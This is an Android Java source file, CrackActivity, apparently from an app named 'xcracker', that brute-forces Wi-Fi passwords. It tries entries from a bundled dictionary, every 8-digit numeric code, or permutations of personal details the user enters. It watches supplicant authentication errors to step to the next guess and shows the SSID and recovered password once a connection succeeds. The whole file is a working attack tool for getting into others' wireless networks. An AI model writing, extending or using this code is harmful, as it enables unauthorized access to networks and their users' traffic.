package com.wifi.xcracker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.IntentFilter;
import android.net.wifi.SupplicantState;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import pl.droidsonroids.gif.GifDrawable;
import pl.droidsonroids.gif.GifImageView;

import static com.wifi.xcracker.WifiAdmin.isWifi;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class CrackActivity extends AppCompatActivity {

    private int cryptotype;
    private int dicLen;
    private int cracknum;
    private int cracktype;
    private boolean cracking;
    private String[] Dic = new String[2500];
    private String Info = new String();
    private String ssid = new String();
    private String[] splitStr = new String[100];
    private boolean mHasPermission;
    private Handler mHandler = new Handler();
    private Runnable mRunnable = new Runnable() {
        public void run() {
            //前端显示GIF动图
            GifImageView gifImageView1 = (GifImageView) findViewById(R.id.gifcalculate);
            GifDrawable gifDrawable = null;
            try {
                gifDrawable = new GifDrawable(getResources(), R.drawable.calculating);
            } catch (IOException e) {
                e.printStackTrace();
            }
            gifImageView1.setImageDrawable(gifDrawable);
        }
    };

    private void registerBroadcastReceiver() {
        BroadcastReceiver wifiScanReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                WifiManager wifiManager = (WifiManager)
                        getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                if (WifiManager.SUPPLICANT_STATE_CHANGED_ACTION.equals(action)) {
                    WifiInfo info = wifiManager.getConnectionInfo();
                    SupplicantState state = info.getSupplicantState();
                    String str = null;
                    String tmp = Integer.toString(cracknum);
                    while (tmp.length() < 8)
                        tmp = '0' + tmp;
                    if (state == SupplicantState.ASSOCIATED) {
                        str = "关联AP完成";
                    } else if (state.toString().equals("AUTHENTICATING")/*SupplicantState.AUTHENTICATING*/) {
                        str = "正在验证";
                    } else if (state == SupplicantState.ASSOCIATING) {
                        str = "正在关联AP...";
                    } else if (state == SupplicantState.COMPLETED) {
                        if (cracking) {
                            cracking = false;
                            Log.d("log: ", "密码破解成功！");
                        } else {
                            str = "已连接";
                            String password = "";
                            if (cracktype == 1 || cracktype == 3) {
                                password = Dic[cracknum];
                            } else if (cracktype == 2) {
                                password = tmp;
                            }
                            Intent intent1 = new Intent(CrackActivity.this, SuccessActivity.class);
                            Bundle bundle1 = new Bundle();
                            bundle1.putCharSequence("ssid", ssid);
                            bundle1.putCharSequence("password", password);
                            intent1.putExtras(bundle1);
                            startActivity(intent1);
                            return;
                        }
                    } else if (state == SupplicantState.DISCONNECTED) {
                        str = "已断开";
                    } else if (state == SupplicantState.DORMANT) {
                        str = "暂停活动";
                    } else if (state == SupplicantState.FOUR_WAY_HANDSHAKE) {
                        str = "四路握手中...";
                    } else if (state == SupplicantState.GROUP_HANDSHAKE) {
                        str = "GROUP_HANDSHAKE";
                    } else if (state == SupplicantState.INACTIVE) {
                        str = "休眠中...";
                    } else if (state == SupplicantState.INVALID) {
                        str = "无效";
                    } else if (state == SupplicantState.SCANNING) {
                        str = "扫描中...";
                    } else if (state == SupplicantState.UNINITIALIZED) {
                        str = "未初始化";
                    }

                    if (cracktype == 1 || cracktype == 3) {
                        Log.d("log", "密码" + Dic[cracknum] + str);
                    } else if (cracktype == 2) {
                        Log.d("log", "密码" + tmp + str);
                    }
                    final int errorCode = intent.getIntExtra(WifiManager.EXTRA_SUPPLICANT_ERROR, -1);
                    if (errorCode == WifiManager.ERROR_AUTHENTICATING) {
                        if (cracktype == 1 || cracktype == 3) {
                            if (cracknum < dicLen) {
                                Log.d("log", "密码" + Dic[cracknum] + "错误");
                                cracknum++;
                                dicTraversal(cracknum);
                            } else {
                                Log.d("log", "字典已遍历完成，密码不在字典中。");
                            }

                        } else if (cracktype == 2) {
                            Log.d("log", "密码" + tmp + "错误");
                            cracknum++;
                            numTraversal(cracknum);
                        }
                    }
                }
            }
        };

        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION);
        getApplicationContext().registerReceiver(wifiScanReceiver, intentFilter);
    }

    private void numTraversal(int num) {
        try {
            String password = Integer.toString(num);
            while (password.length() < 8)
                password = '0' + password;
            ConnectWifi(ssid, password, cryptotype);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void dicTraversal(int num) {
        try {
            String password = Dic[num];
            ConnectWifi(ssid, password, cryptotype);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void readDic() {
        try {
            InputStreamReader inputReader = new InputStreamReader(getResources().getAssets().open("dictionary.txt"));
            BufferedReader bufReader = new BufferedReader(inputReader);
            String line = "";
            dicLen = 0;
            while ((line = bufReader.readLine()) != null) {
                Dic[dicLen] = line;
                dicLen++;
                Log.d("log", line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void Recursion(int current, int maxdepth, int arrlen, boolean[] isadd, String s) {
        if (current == maxdepth && s.length() >= 8) {
            Log.d("s", s);
            Dic[dicLen] = s;
            dicLen++;
            return;
        }
        int i;
        for (i = 0; i < arrlen; i++)
            if (!isadd[i]) {
                isadd[i] = true;
                Recursion(current + 1, maxdepth, arrlen, isadd, s + splitStr[i]);
                isadd[i] = false;
            }
    }

    private void createInforDic() {
        dicLen = 0;
        splitStr = Info.split("\\s+");
        int i;
        boolean[] isadd = new boolean[100];
        for (i = 0; i < splitStr.length; i++)
            isadd[i] = false;
        for (i = 1; i <= splitStr.length; i++) {
            Recursion(0, i, splitStr.length, isadd, "");
        }

    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_crack);

        mHasPermission = checkPermission();
        if (!mHasPermission) {
            requestPermission();
        }

        //GIF线程
        mHandler.post(mRunnable);
        //注册wifi状态监听器
        registerBroadcastReceiver();
        Intent intent = getIntent();
        Bundle bundle = intent.getExtras();
        cracknum = 0;
        cryptotype = bundle.getInt("type");
        ssid = bundle.getString("ssid");
        cracktype = bundle.getInt("method");
        cracking = true;
        Info = bundle.getString("input_message");
        Log.d("log: ", Integer.toString(cryptotype));
        Log.d("log: ", ssid);
        Log.d("log: ", Integer.toString(cracktype));
        //Log.d("log: ", Info);
        //破解WIFI密码
        if (cracktype == 1) {
            readDic();
            dicTraversal(cracknum);
        } else if (cracktype == 2) {
            numTraversal(cracknum);
        } else if (cracktype == 3) {
            createInforDic();
            dicTraversal(cracknum);
        }


    }


    private boolean ConnectWifi(String ssid, String password, int type) throws InterruptedException {
        WifiAdmin wifiAdmin = new WifiAdmin(this);
        //wifiAdmin.openWifi();
        wifiAdmin.addNetwork(wifiAdmin.CreateWifiInfo(ssid, password, type));
        return isWifi(CrackActivity.this);
    }

    private static final String[] NEEDED_PERMISSIONS = new String[]{
            Manifest.permission.CHANGE_NETWORK_STATE,
            Manifest.permission.CHANGE_WIFI_STATE,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.CHANGE_WIFI_MULTICAST_STATE
    };

    private boolean checkPermission() {
        for (String permission : NEEDED_PERMISSIONS) {
            if (ActivityCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }

        return true;
    }

    private static final int PERMISSION_REQUEST_CODE = 0;

    private void requestPermission() {
        ActivityCompat.requestPermissions(this,
                NEEDED_PERMISSIONS, PERMISSION_REQUEST_CODE);
    }
}

